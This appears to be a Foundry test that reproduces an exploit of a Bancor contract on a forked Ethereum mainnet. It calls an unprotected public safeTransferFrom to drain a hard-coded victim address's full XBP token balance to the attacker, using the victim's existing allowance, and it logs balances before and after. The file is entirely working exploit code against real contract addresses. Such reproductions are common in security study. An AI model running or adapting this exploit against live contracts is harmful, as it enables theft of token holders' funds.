// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import "./IERC20.sol";

interface IBancor {
    function safeTransferFrom(IERC20 _token, address _from, address _to, uint256 _value) external;
}

// forge test --fork-url wss://eth.drpc.org --fork-block-number 10307563 -vvv
contract BancorTest is Test {
    address bancorAddress = 0x5f58058C0eC971492166763c8C22632B583F667f;
    address victim = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;
    address attacker = address(this);
    IERC20 XBPToken = IERC20(0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40);

    IBancor bancorContract = IBancor(bancorAddress);

    function testsafeTransfer() public {
        console.log(
            "Victim XBPToken Allowance to Bancor Contract: ", (XBPToken.allowance(victim, bancorAddress) / 1 ether)
        );
        console.log("[Before Attack] Victim XBPToken Balance: ", (XBPToken.balanceOf(victim)) / 1 ether);
        console.log("[Before Attack] Attacker XBPToken Balance: ", (XBPToken.balanceOf(attacker)) / 1 ether);

        bancorContract.safeTransferFrom(IERC20(address(XBPToken)), victim, attacker, XBPToken.balanceOf(victim));

        console.log("[After Attack] Victim XBPToken Balance: ", (XBPToken.balanceOf(victim)) / 1 ether);
        console.log("[After Attack] Attacker XBPToken Balance: ", (XBPToken.balanceOf(attacker)) / 1 ether);
    }
}
